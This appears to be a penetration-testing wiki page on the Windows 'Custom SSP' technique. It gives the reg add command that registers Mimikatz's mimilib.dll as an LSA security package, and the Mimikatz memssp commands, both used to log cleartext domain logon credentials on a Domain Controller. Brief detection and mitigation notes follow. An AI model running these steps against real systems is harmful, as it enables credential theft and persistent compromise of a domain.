# Custom SSP

## Description

A Security Service Provider (SSP) is implemented via the Security Support Provider Interface (SSPI) which is part of the Windows Client Authentication Architecture.

The SSPI will dictate what protocols systems should use to authenticate between each other when communicating. The default protocol is Kerberos, however when not possible the following may also be utilized:

| SSP Protocol  | File Location                    |
| ------------- | -------------------------------- |
| Negotiate SSP | C:\Windows\System32\lsasrv.dll   |
| Kerberos SSP  | C:\Windows\System32\kerberos.dll |
| NTLM SSP      | C:\Windows\System32\msv1\_0.dll  |
| Schannel SSP  | C:\Windows\System32\Schannel.dll |
| Digest SSP    | C:\Windows\System32\Wdigest.dll  |
| CredSSP       | C:\Windows\System32\credssp.dll  |

## Exploitation - Persistent

It is possible to inject a custom SSP into a target Domain Controller which can be used to intercept credentials and store them for later retrieval in plain text. Mimikatz comes with the ability to perform this interception with the `mimilib.dll` provided.

Copying the `mimilib.dll` file from Mimikatz into the SYSTEM32 folder and then adding the `mimilib.dll` file as a security package with the below command.

```bash
# Create Key
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f
# Confirm changes
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
```

![](<../../../.gitbook/assets/image (2018).png>)

After completing and confirming changes, when a user next authenticates against the Domain Controller the credentials will be captured in cleartext in a file called `kiwissp.txt` inside SYSTEM32.

![](<../../../.gitbook/assets/image (2017).png>)

As these changes are made to the registry and a permanent file is dropping into SYSTEM32 this attack vector will persist after reboots.

## Exploitation - In Memory

The same process can be performed by injecting a new SSP provider directly into memory with Mimikatz. This technique however, will not persist after a reboot.

{% tabs %}
{% tab title="Mimikatz" %}
```
privilege::debug
misc::memssp
```
{% endtab %}
{% endtabs %}

![](<../../../.gitbook/assets/image (2015).png>)

When someone next authenticates against the Domain Controller the file `mimilsa.txt` in System32 will be generated and contain cleartext logon credentials.

The below example was generated from one of the Domain Administrators called Moe logging on interactively to the Domain Controller and his resulting credentials being logged.

![](<../../../.gitbook/assets/image (2016).png>)

## Detection

* Monitor for changes made to `"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages"`

## Mitigation

* Protect Domain Administrator accounts

## References

**Security Support ProviderInterface:**[https://en.wikipedia.org/wiki/Security\_Support\_Provider\_Interface](https://en.wikipedia.org/wiki/Security\_Support\_Provider\_Interface)

***

**Security Support Providers (SSPs):**[https://docs.microsoft.com/en-us/windows/win32/rpc/security-support-providers-ssps-](https://docs.microsoft.com/en-us/windows/win32/rpc/security-support-providers-ssps-)

{% embed url="https://en.wikipedia.org/wiki/Security_Support_Provider_Interface" %}

{% embed url="https://docs.microsoft.com/en-us/windows/win32/rpc/security-support-providers-ssps-" %}

{% embed url="https://adsecurity.org/?p=1760" %}
